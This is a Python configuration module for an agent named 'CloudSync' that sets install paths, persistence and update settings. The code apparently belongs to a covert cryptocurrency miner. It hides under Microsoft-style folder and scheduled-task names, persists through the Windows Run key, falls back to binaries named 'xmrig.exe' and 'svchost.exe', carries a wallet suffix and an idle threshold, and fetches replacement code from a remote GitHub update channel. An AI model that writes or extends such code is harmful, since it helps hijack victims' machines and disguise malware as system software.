"""Settings: ``install.json`` + ``manifest.json`` for one install directory.

Feature-parity target: the ``Settings`` class in ``F:\\Test Miner\\controller.py``.
Nothing here raises for a missing or malformed file: a legacy box with no
``install.json`` (or a repo-pushed ``manifest.json``) still yields a usable
``Settings`` object built from the kit defaults.

Install-directory resolution (TEST-REPORT D1) lives in
:func:`resolve_install_dir`: an explicit directory, else the current working
directory when it holds ``install.json``, else the per-user installer default,
else the machine-wide installer default. That makes ``pythonw -m cloudsync``
started from the install directory work for both layouts with no environment
variables.

No work happens at import time; the constructor only reads the two files.
"""

import copy
import json
import os

__all__ = [
    "BINARY_FALLBACKS",
    "DEFAULT_BINARY",
    "DEFAULT_IDLE_SECONDS",
    "DEFAULT_RUN_KEY",
    "DEFAULT_RUN_NAME",
    "DEFAULT_TASKS",
    "DEFAULT_UPDATE_BASE",
    "DEFAULT_UPDATE_FILES",
    "Settings",
    "default_install_dir",
    "local_install_dir",
    "machine_install_dir",
    "read_json",
    "resolve_binary",
    "resolve_install_dir",
]

# Installer defaults (install-task.ps1 param block / controller.py constants).
DEFAULT_BINARY = "CloudSync.exe"
DEFAULT_IDLE_SECONDS = 180
DEFAULT_RUN_NAME = "CloudSync"
DEFAULT_RUN_KEY = r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
DEFAULT_TASKS = (
    r"Microsoft\Windows\CloudSync\CloudSync",
    r"Microsoft\Windows\CloudSync\CloudSyncHealth",
)
DEFAULT_UPDATE_BASE = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/"
DEFAULT_UPDATE_FILES = ("controller.py", "gpudetect.py", "config_high.json")

#: File the installer writes into an install directory (adoption marker).
INSTALL_NAME = "install.json"

# Names tried when the configured binary is absent (pre-overhaul installs).
BINARY_FALLBACKS = ("CloudSync.exe", "svchost.exe", "xmrig.exe", "WinSync.exe")

# Settings attributes that per-host overrides may change (see config.overrides).
OVERRIDABLE = {
    "idle_seconds": int,
    "force_gpu": bool,
    "remote_update": bool,
    "legacy_update": bool,
}


def local_install_dir():
    """Per-user installer default: ``%LOCALAPPDATA%\\Microsoft\\CloudSync``."""
    base = os.environ.get("LOCALAPPDATA")
    if not base:
        base = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    return os.path.join(base, "Microsoft", "CloudSync")


def machine_install_dir():
    """Machine-wide installer default: ``%ProgramData%\\Microsoft\\CloudSync``."""
    base = os.environ.get("ProgramData")
    if not base:
        base = r"C:\ProgramData"
    return os.path.join(base, "Microsoft", "CloudSync")


def resolve_install_dir(explicit=None, cwd=None):
    """Resolve the install directory for this process (TEST-REPORT D1).

    Resolution order:

    1. *explicit* -- the caller already knows (``Settings(install_dir=...)``);
    2. the current working directory when it contains ``install.json`` -- how a
       machine-wide install launches ``pythonw -m cloudsync`` from its own dir;
    3. the per-user default, when that directory exists;
    4. the machine-wide default.

    Always returns an absolute path and never raises. The result is not
    required to exist: a missing directory is the caller's signal to report the
    problem rather than silently writing nowhere.
    """
    if explicit:
        return os.path.abspath(os.fspath(explicit))

    try:
        working = os.path.abspath(cwd if cwd is not None else os.getcwd())
    except (OSError, TypeError):
        working = ""
    if working and os.path.isfile(os.path.join(working, INSTALL_NAME)):
        return working

    local = local_install_dir()
    if os.path.isdir(local):
        return local
    return machine_install_dir()


def default_install_dir():
    """Backwards-compatible alias for the per-user installer default."""
    return local_install_dir()


def read_json(path, default=None):
    """Read a JSON file, tolerating a UTF-8 BOM; return *default* on any error.

    ``utf-8-sig`` matches the original ``controller.read_json``: PowerShell 5.1's
    ``Set-Content`` writes a BOM that plain ``json.load`` rejects.
    """
    try:
        with open(path, "r", encoding="utf-8-sig") as handle:
            return json.load(handle)
    except (OSError, ValueError):
        return default


def resolve_binary(install_dir, preferred):
    """Return ``(name, absolute_path)`` for the worker binary; never raises.

    Same order as ``controller.resolve_binary``: the configured name wins, then
    the known kit names, then any ``.exe`` in the install directory. If nothing
    exists the configured path is returned so the caller can log it.
    """
    preferred = preferred or DEFAULT_BINARY
    path = os.path.join(install_dir, preferred)
    if os.path.isfile(path):
        return preferred, path
    for name in BINARY_FALLBACKS:
        candidate = os.path.join(install_dir, name)
        if os.path.isfile(candidate):
            return name, candidate
    try:
        for name in sorted(os.listdir(install_dir)):
            if name.lower().endswith(".exe"):
                return name, os.path.join(install_dir, name)
    except OSError:
        pass
    return preferred, path


def _as_dict(value):
    """Return *value* when it is a dict, otherwise an empty dict."""
    return value if isinstance(value, dict) else {}


def _as_int(value, fallback):
    """Coerce *value* to int, returning *fallback* for junk/missing values."""
    try:
        return int(value)
    except (TypeError, ValueError):
        return int(fallback)


def _as_tasks(value, fallback):
    """Normalise a task list (missing/empty/wrong type -> *fallback*)."""
    if isinstance(value, str):
        return [value]
    if isinstance(value, (list, tuple)) and value:
        return [str(item) for item in value]
    return list(fallback)


class Settings:
    """Effective settings for one install directory.

    With no argument the directory is resolved by :func:`resolve_install_dir`
    (cwd-with-``install.json`` wins over the installer defaults), so bare
    ``Settings()`` works for both per-user and machine-wide layouts. Pass
    ``install_dir`` in tests. Read ``install.json`` first, then overlay
    ``manifest.json`` values that the kit lets the update channel control, and
    expose the paths/helpers the rest of the agent needs.
    """

    def __init__(self, install_dir=None):
        self.install_dir = resolve_install_dir(install_dir)

        install = _as_dict(read_json(self.path("install.json"), {}))
        manifest = _as_dict(read_json(self.path("manifest.json"), {}))

        manifest_idle = _as_int(manifest.get("idle_seconds"), DEFAULT_IDLE_SECONDS)

        # --- install.json (local source of truth; written by install-task.ps1)
        self.python = install.get("python") or ""
        self.pythonw = install.get("pythonw") or self.python
        # Parity: install.json tasks win, then manifest tasks, then the defaults.
        self.tasks = _as_tasks(
            install.get("tasks") or manifest.get("tasks"), DEFAULT_TASKS
        )
        self.backup_dir = install.get("backup_dir") or ""
        self.run_name = install.get("run_name") or DEFAULT_RUN_NAME
        self.run_key = install.get("run_key") or DEFAULT_RUN_KEY
        self.installed_at = install.get("installed_at") or ""
        self.installed_files = _as_dict(install.get("files"))
        # Runtime flavour written by install-task.ps1: "flat" (controller.py,
        # the legacy default) or "modular" (pythonw -m cloudsync). Absent on
        # older installs -> flat, so their update behaviour is unchanged.
        self.runtime = str(install.get("runtime") or "flat").strip().lower() or "flat"
        self.idle_seconds = _as_int(install.get("idle_seconds"), manifest_idle)

        # --- manifest.json (repo-controlled; may be absent on a legacy box)
        self.name = manifest.get("name") or "CloudSync"
        self.version = _as_int(manifest.get("version"), 0)
        self.update_base = manifest.get("update_base") or DEFAULT_UPDATE_BASE
        self.update_files = manifest.get("files") or list(DEFAULT_UPDATE_FILES)
        # SPEC names the manifest field "worker_tag"; controller.py called the
        # same value "wallet_suffix". Expose both so either caller keeps working.
        self.worker_tag = manifest.get("worker_tag") or "w"
        self.wallet_suffix = self.worker_tag
        self.force_gpu = bool(manifest.get("force_gpu"))
        self.legacy_update = bool(manifest.get("legacy_update"))
        # Master switch for the repo updater; absent means enabled (parity).
        self.remote_update = bool(manifest.get("remote_update", True))

        # --- resolved worker binary (parity with resolve_binary at startup)
        preferred = manifest.get("binary") or install.get("binary") or DEFAULT_BINARY
        self.binary, self.bin_path = resolve_binary(self.install_dir, preferred)

    # -- helpers ----------------------------------------------------------

    @classmethod
    def from_install(cls, install_dir, overrides=None):
        """Build settings from *install_dir* (missing files -> defaults).

        ``overrides`` is an optional, already-validated mapping of attribute
        values (see :func:`cloudsync.config.overrides.settings_from_section`).
        """
        settings = cls(install_dir)
        if overrides:
            settings = settings.with_overrides(overrides)
        return settings

    def path(self, name):
        """Absolute path of *name* inside the install directory."""
        return os.path.join(self.install_dir, name)

    def worker_binary(self):
        """Absolute path of the resolved worker binary (may not exist yet)."""
        return self.bin_path

    def is_modular(self):
        """True when this install runs the package (``pythonw -m cloudsync``).

        A modular install must not consume the flat update channel's
        ``controller.py`` entry: the updater would otherwise re-create the flat
        runtime in the install directory and the Run key could drift back to it
        (see ``updater.Updater._targets`` and ``updater.handle_probation``).
        """
        return self.runtime == "modular"

    def update_url(self, name):
        """Absolute URL of *name* on the update channel (base gets a slash)."""
        base = self.update_base
        if not base.endswith("/"):
            base += "/"
        return base + name

    def with_overrides(self, overrides):
        """Return a copy with validated per-host overrides applied.

        Only keys in :data:`OVERRIDABLE` with the right exact type are applied;
        anything else is ignored so a bad overrides file cannot corrupt the
        runtime settings. Returns ``self`` unchanged when nothing applies.
        """
        changed = False
        clone = None
        values = overrides if isinstance(overrides, dict) else {}
        for key, value in values.items():
            expected = OVERRIDABLE.get(key)
            if expected is None or type(value) is not expected:
                continue
            if clone is None:
                clone = copy.copy(self)
            setattr(clone, key, value)
            changed = True
        return clone if changed else self

    @property
    def idle(self):
        """Legacy alias for :attr:`idle_seconds` (controller.py naming)."""
        return self.idle_seconds

    def __repr__(self):
        return (
            "Settings(install_dir={0!r}, binary={1!r}, idle_seconds={2!r}, "
            "version={3!r})".format(
                self.install_dir, self.binary, self.idle_seconds, self.version
            )
        )
